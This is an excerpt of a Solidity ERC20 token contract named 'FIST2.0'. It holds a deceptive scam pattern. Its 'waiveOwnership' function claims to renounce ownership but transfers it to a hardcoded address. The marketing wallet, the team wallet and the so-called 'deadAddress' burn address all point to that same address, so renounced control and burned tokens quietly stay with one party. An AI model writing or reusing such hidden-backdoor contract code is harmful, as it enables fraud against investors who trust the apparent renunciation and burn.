...
contract Ownable is Context {
    ...
    function waiveOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0xc419bfe32cE59EcFC9204f7D29D565FD1Dd69ac1));
        _owner = address(0xc419bfe32cE59EcFC9204f7D29D565FD1Dd69ac1);
    }
...
contract FIST20 is Context, IERC20, Ownable {
    
    using SafeMath for uint256;
    using Address for address;
    
    string private _name = "FIST2.0";
    string private _symbol = "FIST2.0";
    uint8 private _decimals = 9;

    address payable public marketingWalletAddress = payable(0xc419bfe32cE59EcFC9204f7D29D565FD1Dd69ac1);
    address payable public teamWalletAddress = payable(0xc419bfe32cE59EcFC9204f7D29D565FD1Dd69ac1);
    address public immutable deadAddress = 0xc419bfe32cE59EcFC9204f7D29D565FD1Dd69ac1;
